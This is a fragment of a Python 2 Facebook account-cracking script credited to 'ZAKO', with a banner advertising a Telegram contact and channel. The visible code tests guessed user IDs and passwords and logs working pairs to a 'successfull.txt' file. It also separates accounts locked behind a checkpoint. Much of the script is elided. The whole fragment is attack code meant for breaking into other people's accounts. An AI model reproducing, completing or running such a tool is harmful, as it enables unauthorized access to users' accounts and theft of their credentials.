...
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
\033[36;1mCOD BY : Z  K  K  O
\033[36;1mTELEGRAM: @MK_I_S
\033[32;1mCHANNEL : https://t.me/sana_kurdish 
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[ZAKO-OK]\x1b[1;95m ' + k + c + user + ' >>> ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '---->' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[ZAKO-CP]\x1b[1;96m ' + k + c + user + ' >>> ' + pass1 + '\n'
